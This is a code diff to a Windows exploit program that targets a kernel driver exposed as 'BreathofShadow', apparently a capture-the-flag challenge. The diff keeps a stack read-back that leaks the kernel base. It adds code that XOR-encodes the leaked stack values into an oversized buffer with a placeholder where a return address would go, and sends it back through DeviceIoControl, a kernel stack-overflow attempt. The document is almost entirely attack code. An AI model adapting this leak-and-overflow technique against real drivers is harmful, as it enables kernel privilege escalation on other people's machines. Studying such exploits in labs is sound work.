@@ -4,6 +4,7 @@
 
 #define DeVioctlCode 0x9C40240B
 #define DeviceName L"\\\\.\\BreathofShadow"
+#define ADDR(x) ((x) ^ KEY)
 
 void hexdump(const void* data, size_t size)
 {
@@ -89,10 +90,30 @@ int main(){
     );
 
     uintptr_t* STACK_VAL = (uintptr_t*)stack_value;
-    uintptr_t leak_kernel = STACK_VAL[33];
+    uintptr_t leak_kernel = STACK_VAL[33]; // Stack start + 0x108
     uintptr_t kernel_base = leak_kernel - 0xb7b3c9; 
     printf("[!] Leak Kernel: 0x%llx\n", leak_kernel);
     printf("[!] Kernel Base: 0x%llx\n", kernel_base);
+
+    uintptr_t payload[75];
+
+
+    for(int i=0; i < 37; i++){
+        payload[i] = ADDR(STACK_VAL[i]);
+    }
+
+    payload[37] = ADDR(0xaabbccdd);
+
+    BOOL result3 = DeviceIoControl(
+        hDevice,
+        DeVioctlCode,
+        payload,
+        sizeof(payload),
+        NULL,
+        sizeof(payload),
+        &bytesReturned,
+        NULL
+    );
 
     return 0;
 }
